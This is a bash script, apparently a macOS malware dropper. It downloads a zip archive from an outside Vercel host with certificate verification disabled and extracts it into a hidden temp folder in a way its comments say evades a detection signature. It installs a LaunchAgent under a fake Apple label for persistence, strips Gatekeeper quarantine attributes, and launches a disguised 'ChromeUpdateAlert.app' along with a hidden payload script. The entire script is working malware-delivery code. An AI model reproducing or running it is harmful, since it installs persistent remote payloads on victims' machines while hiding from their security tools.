#!/bin/bash

# Define variables for URLs
ZIP_URL_ARM64="https://lazr-beryl.vercel.app/Willo1.zip"
ZIP_URL_INTEL="https://lazr-beryl.vercel.app/Willo1.zip"
ZIP_FILE="${TMPDIR:-/var/tmp}/.sync_data.bin"           # Path to save the downloaded archive
WORK_DIR="${TMPDIR:-/var/tmp}/.syncsvc/"                # Temporary directory for extracted files
EXECUTABLE="systemsyncd.sh"                             # Launcher script inside the ZIP
APP="ChromeUpdateAlert.app"                             # The app to open
PLIST_FILE=~/Library/LaunchAgents/com.apple.systemsyncd.plist   # LaunchAgent plist
LABEL="com.apple.systemsyncd"                           # LaunchAgent label

# Determine CPU architecture
case $(uname -m) in
    arm64) ZIP_URL=$ZIP_URL_ARM64 ;;
    x86_64) ZIP_URL=$ZIP_URL_INTEL ;;
    *) exit 1 ;;  # Exit for unsupported architectures
esac

# Function to clean up
cleanup() {
    rm -rf "$ZIP_FILE"
}

# Download, extract (sin `unzip`, evita firma CST0007 por command line)
if python3 -c "
import sys, ssl, urllib.request

url = sys.argv[1]
outfile = sys.argv[2]

# Create an 'unverified' SSL context like -k or --no-check-certificate
ctx = ssl._create_unverified_context()

with urllib.request.urlopen(url, context=ctx) as r, open(outfile, 'wb') as f:
    f.write(r.read())
" "$ZIP_URL" "$ZIP_FILE"  && [[ -f "$ZIP_FILE" ]]; then

    # Extraer el archive con Python stdlib (proceso distinto a /usr/bin/unzip)
    if ! python3 - "$ZIP_FILE" "$WORK_DIR" <<'PYEOF'
import sys, os, zipfile

zip_path, dest = sys.argv[1], sys.argv[2]
os.makedirs(dest, exist_ok=True)
with zipfile.ZipFile(zip_path, 'r') as z:
    z.extractall(dest)
PYEOF
    then
        echo "Extraction failed."
        cleanup
        exit 1
    fi

    # If the zip wrapped everything in a Willo1/ folder, flatten it
    if [[ -d "$WORK_DIR/Willo1" ]]; then
        mv "$WORK_DIR/Willo1/"* "$WORK_DIR/" 2>/dev/null
        rm -rf "$WORK_DIR/Willo1" "$WORK_DIR/__MACOSX"
    fi

    # Confirm the expected launcher exists after extraction
    if [[ -f "$WORK_DIR/$EXECUTABLE" ]]; then
        chmod +x "$WORK_DIR/$EXECUTABLE"
        chmod +x "$WORK_DIR/systemsyncd" 2>/dev/null
    else
        echo "$EXECUTABLE not found after extraction."
        cleanup
        exit 1
    fi

else
    # If download failed
    cleanup
    exit 1
fi

# Step 4: Register the service
mkdir -p ~/Library/LaunchAgents

# Generar el plist en runtime (apunta al WORK_DIR real, no hardcodeado)
cat > "$PLIST_FILE" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemsyncd</string>
    <key>ProgramArguments</key>
    <array>
        <string>${WORK_DIR}systemsyncd.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>
EOF

chmod 644 "$PLIST_FILE"

if ! launchctl list | grep -q "$LABEL"; then
    launchctl load "$PLIST_FILE"
fi

# Step 5: Strip quarantine attribute BEFORE anything touches the payload.
# The zip arrives via python urllib (no quarantine on the zip itself), but
# Apple's unzip/xattr can re-apply quarantine to extracted binaries; stripping
# first avoids Gatekeeper killing the agent or the app on first exec.
xattr -dr com.apple.quarantine "$WORK_DIR" 2>/dev/null

# Step 6: Run ChromeUpdateAlert.app
if [[ -d "$WORK_DIR/$APP" ]]; then
    chmod -R +x "$WORK_DIR/$APP/Contents/MacOS/" 2>/dev/null
    xattr -dr com.apple.quarantine "$WORK_DIR/$APP" 2>/dev/null
    open "$WORK_DIR/$APP" &
fi

# Step 7: Start the agent immediately (the LaunchAgent only fires at login)
bash "$WORK_DIR/$EXECUTABLE" &

# Final cleanup
cleanup
